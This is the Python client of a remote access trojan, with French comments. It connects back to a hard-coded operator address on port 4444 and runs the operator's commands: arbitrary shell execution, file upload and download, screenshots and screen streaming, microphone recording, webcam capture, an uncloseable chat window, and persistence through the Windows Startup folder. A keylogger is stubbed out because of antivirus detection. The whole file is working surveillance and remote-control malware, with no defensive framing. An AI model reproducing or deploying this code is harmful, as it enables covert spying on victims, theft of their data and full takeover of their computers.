import socket
import subprocess
import time
import os
import threading
import sys
import pyautogui #screenshot
import random
import json
#audio record/play
import pyaudio
import wave
import playsound
import mutagen #sound duration
from mutagen.wave import WAVE
#key
from pynput.keyboard import Key, Listener
import logging

import cv2 #webcam

import tkinter #ChatBox

#####PARAM
port = 4444
host = "192.168.43.190"


#####SIGNATURE
a=22+8
b=8+6


stopReceive = False

chatBoxOpen = False
root = None
txt = None

def send(client,data):
    data = json.dumps(data)#to json
    data = bytes(data,"utf-8")
    client.send(data)


def connect(s,host,port):
    while True:
        print('[+]connecting to the host('+host +':'+str(port)+")...")

        try:
            s.connect((host , port))
            print("[+]connected !")
            return s
        except socket.error:
            print('[+]failed to create socket, retrying in 3s...')
            time.sleep(3)

            # Connect to remote server


def cmd(client,data):
    global stopReceive
    try:
        split = data.split(" ")

        if split[0] == "!cd":#déplacement de directory
            ##TODO gérer erreur coté serveur
            os.chdir(split[1])
            send(client,"[+]successful")

        elif split[0] == "!upload":
            stopReceive = True
            uploadFile(client,split[1])
            #threading.Thread(target=uploadFile,args=(client,split[1])).start()


        elif split[0] == "!download":
            downloadFile(client,split[1])


        elif split[0] == "!screenshot":
            screenShot(client)

        elif split[0] == "!record_mic":
            recordAndSaveAudio(client,split[1])

        elif split[0] == "!play":
            stopReceive = True
            uploadFile(client,split[1])
            time.sleep(1)

            playSoundAndDelete(client,split[1])

        elif split[0] == "!webcam_snap":
            webcam_snap(client)

        elif split[0] == "!chatbox":
            chatbox(client)

        elif split[0] == "!persist":
            persist()

        elif split[0] == "!screenshare":
            sreenshare(client,split[1])


        elif split[0] == "!keylog_start": ##DONT WORK : av detected
            key(client)




        else:#cas ou c'est une commande powershell

            p = subprocess.Popen(data,shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
            out = p.stdout.read()+p.stderr.read()
            send(client,str(out))
    except Exception as err:
        print(str(err))
        send(client,"[+]command failed...") #si erreur dans la commande powershell

def receive(client):
    data=''

    while True:

        try:
            if(not(stopReceive)):

                dataStr = client.recv(1024).decode().rstrip()


                data = json.loads(dataStr)
                #Traitement pour mise en forme
                data = data.replace(r'\n', '\n')
                data = data.replace(r'\r', '\r')
                data = data.replace(r'\\','\\')
                #traitement pour accent : é
                data = data.replace("\x82","é")
                data = data.replace("\x8a","è")

                if(data == "!exit"):
                    print("[+]disconnected")
                    client.close()
                    break
                elif(data[:3]=="```" and chatBoxOpen): #transfers vers le traitement de messages ChatBox

                    listen_messages(data)

                else:

                    threading.Thread(target=cmd,args=(client,data)).start()

        except Exception as err:
            print(str(err))
            print("[+]error in receive(). closing socket...")
            client.close()
            exit()


def downloadFile(client,fileName):
    try:
        f = open(fileName,"rb")
        client.send(f.read())
    except FileNotFoundError:
        print("[+]impossible d'ouvrir le fichier")


def uploadFile(client,file_name):

    global stopReceive

    f=open(file_name,"wb")

    client.settimeout(3)


    chunk = client.recv(1024)


    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()
    stopReceive = False

def screenShot(client):
    screenShot = pyautogui.screenshot()
    randomName = str(random.randint(99,99999999))+".png"
    screenShot.save(randomName)
    #download image to server
    downloadFile(client,randomName)
    time.sleep(1)
    os.remove(randomName)

def recordAndSaveAudio(client,timeR):
    randomName = str(random.randint(99,99999999))+".wav"
    chunk = 1024
    FORMAT = pyaudio.paInt16
    channels = 1
    sample_rate = 44100
    record_seconds = int(timeR)
    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    frames = []
    print("Recording...")
    for i in range(int(sample_rate / chunk * record_seconds)):
        data = stream.read(chunk)
        frames.append(data)
    print("Finished recording.")

    stream.stop_stream()
    stream.close()

    p.terminate()

    wf = wave.open(randomName, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(sample_rate)
    wf.writeframes(b"".join(frames))
    wf.close()

    #send file to server

    downloadFile(client,randomName)

    time.sleep(1)
    os.remove(randomName)

def playSoundAndDelete(client,name):
    audio = WAVE(name)
    audio_info = audio.info
    length = int(audio_info.length)
    playsound.playsound(name)

    #delete file at the end
    time.sleep(length)
    p = subprocess.Popen("del "+name,shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)

def key(client):
    """
    logging.basicConfig(filename="log.txt",level=logging.DEBUG,format="%(asctime)s: %(message)s")

    def on_press(key):
        pass


    #Collect events until released
    with Listener(on_press=on_press) as listener:
        listener.join()
    """
    pass

def webcam_snap(client):
    randomName = str(random.randint(99,99999999))+".jpg"
    cam = cv2.VideoCapture(0)

    ret, img = cam.read()
    cv2.imwrite(randomName, img)

    cam.release()
    cv2.destroyAllWindows()


    downloadFile(client,randomName)
    time.sleep(1)
    os.remove(randomName)

def chatbox(client):
    global chatBoxOpen
    global root
    global txt
    chatBoxOpen = True

    root = tkinter.Tk()
    root.title("ChatBox")

    BG_GRAY = "#ABB2B9"
    BG_COLOR = "#17202A"
    TEXT_COLOR = "#EAECEE"

    FONT = "Helvetica 14"
    FONT_BOLD = "Helvetica 13 bold"



    def disable_event():
        pass

    def closeWhenCloseChatBox():
        print("closeee")
        while chatBoxOpen:
            pass
        root.destroy()

    # Send function
    def envoie():

        mes1 = "```"+e.get()
        mes = "User -> " + e.get()

        #envoyer message à admin
        send(client,mes1)

        txt.insert(tkinter.END, "\n" + mes)
        e.delete(0, tkinter.END)


    #threading.Thread(target=listen_messages,args=()).start()

    t = threading.Thread(target=closeWhenCloseChatBox,args=())
    t.start()

    lable1 = tkinter.Label(root, bg=BG_COLOR, fg=TEXT_COLOR, text="ChatBox", font=FONT_BOLD, pady=10, width=20, height=1).grid(
        row=0)

    txt = tkinter.Text(root, bg=BG_COLOR, fg=TEXT_COLOR, font=FONT, width=60)
    txt.grid(row=1, column=0, columnspan=2)

    scrollbar = tkinter.Scrollbar(txt)
    scrollbar.place(relheight=1, relx=0.974)

    e = tkinter.Entry(root, bg="#2C3E50", fg=TEXT_COLOR, font=FONT, width=55)
    e.grid(row=2, column=0)

    mes = tkinter.Button(root, text="Send", font=FONT_BOLD, bg=BG_GRAY,
                  command=envoie).grid(row=2, column=1)

    #no close
    root.protocol("WM_DELETE_WINDOW", disable_event)

    root.mainloop()

def listen_messages(rec): #utilisation dans receive pour transferer un receive de message (utilisation seulement si chatbox est ouverte)
    global chatBoxOpen
    global root
    global txt


    if(rec[:3] == "```"):
        rec = rec.replace("`","")

        if(rec == "@@$$**@ù"):#exit message
            txt = None
            chatBoxOpen = False #un thread check si cette valeur passe à false pour fermer la fenetre : closeWhenCloseChatBox


        else:
            recC = "Admin -> "+rec
            txt.insert(tkinter.END, "\n" + recC)

def sreenshare(client,fps):
    print("ccc")
    fps = float(fps)
    i=0
    while True:

        #screenshot
        screenShot = pyautogui.screenshot()
        name="screenshareimg#"+str(i)+".png"
        screenShot.save(name)
        #download image to server
        downloadFile(client,name)

        time.sleep(fps)

        i+=1

        os.remove(name)



def persist():
    pathFile = os.path.basename(__file__)
    exeFile = pathFile.replace(".py",".exe")
    os.system("copy "+exeFile+" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")

if __name__ == "__main__":
    ##TODO run persistance
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client = connect(s,host,port)
    receive(client)
